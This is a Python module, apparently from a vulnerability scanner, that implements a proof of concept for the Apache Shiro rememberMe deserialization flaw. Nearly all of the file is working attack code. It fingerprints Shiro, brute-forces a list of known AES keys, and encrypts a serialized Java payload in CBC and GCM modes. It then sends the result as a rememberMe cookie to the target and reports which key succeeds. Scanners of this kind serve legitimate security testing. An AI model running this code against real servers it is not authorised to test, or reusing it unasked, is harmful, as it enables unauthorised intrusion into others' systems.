import base64
import threading
import uuid

from Crypto.Cipher import AES

from vulscan_Project import requestUtil
from .. import fileUtil
from ServiceScanModel.models import ServiceScan

from ..requestClass import Requests


class Poc(threading.Thread):
    def __init__(self, key, url, mode):
        threading.Thread.__init__(self)
        self.key = key
        self.url = url
        self.result = False
        self.mode = mode
        self.expection = False

    def cbc_encrypt(self, key):
        file = fileUtil.open_file("dict_shiro/payload.ser", "rb")
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()  # 使文件内容满足AES加密长度要求
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(file.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        file.close()
        return str(base64_ciphertext, "UTF-8")

    def gcm_encrypt(self, key):
        file = fileUtil.open_file("dict_shiro/payload.ser", "rb")
        BS = AES.block_size
        mode = AES.MODE_GCM
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()  # 使文件内容满足AES加密长度要求
        file_body = pad(file.read())
        enc, tag = encryptor.encrypt_and_digest(file_body)
        base64_ciphertext = base64.b64encode(iv + enc + tag)
        file.close()
        return str(base64_ciphertext, "UTF-8")

    def run(self):
        try:
            encrypt = getattr(self, self.mode + "_encrypt")
            self.cookies = "rememberMe=%s" % encrypt(self.key)
            resp = requestUtil.get(self.url, cookies=self.cookies)
            if not "rememberme" in str(resp.headers).lower():
                self.result = True
        except Exception as e:
            self.expection = True
            pass

    def get_results(self):
        return self.result

    def get_expection(self):
        return self.expection

class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil= Requests(service.cookies)
        self.result = False

    def fingerprint(self):
        if self.service.url:
            print(self.service.url)
            resp = requestUtil.get(self.service.url, cookies="rememberMe=1")
            print(str(resp.headers).lower())
            try:
                if "rememberme" in str(resp.headers).lower():
                    return True
            except Exception as e:
                print(e)
                return False


    def poc(self):
        key_file = fileUtil.open_file("dict_shiro/key.txt")
        key_list = [k.strip() for k in key_file.readlines()]

        def test(mode):
            shiro_list = []
            for i in key_list:
                key = i.strip()
                shiro_list.append(Poc(key, self.service.url, mode))
            for s in shiro_list:
                s.start()
            for s in shiro_list:
                s.join()
            for s in shiro_list:
                if s.get_expection():
                    return ["shiro扫描出错", "Cookie：rememberMe=1", "success"]
                if s.get_results():
                    return ["shiro反序列化漏洞",
                            "Cookie：rememberMe=%s...<br>Mode：%s<br>Key：%s" % (s.cookies.replace("rememberMe=", "")[:10], s.mode, s.key)]
            return ["存在shiro框架", "Cookie：rememberMe=1", "success"]

        result_cbc = test("cbc")
        if len(result_cbc) == 3 and not "扫描出错" in result_cbc[0]:
            return test("gcm")
        else:
            return result_cbc
